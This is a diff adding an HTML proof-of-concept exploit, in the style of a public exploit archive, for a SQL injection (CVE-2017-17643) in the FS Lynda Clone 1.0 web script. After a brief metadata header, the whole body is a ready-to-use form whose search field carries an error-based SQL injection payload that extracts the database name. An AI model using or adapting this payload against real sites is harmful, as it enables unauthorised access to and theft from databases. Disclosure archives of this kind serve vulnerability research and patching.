@@ -1,0 +1,29 @@
+<!--
+# # # # # 
+# Exploit Title: FS Lynda Clone 1.0 - SQL Injection
+# Dork: N/A
+# Date: 13.12.2017
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/lynda-clone/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-17643
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+-->
+<html>
+<body>
+<form action="http://localhost/tutorial/" method="post">
+<input value="1' and(select 1 FROM(select count(*),concat((select (select concat(database(),0x27,0x7e,0x494853414e2053454e43414e)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -" name="keywords" id="keywords" type="search">
+<input value="GO" type="submit">
+</form>
+</body>
+</html>
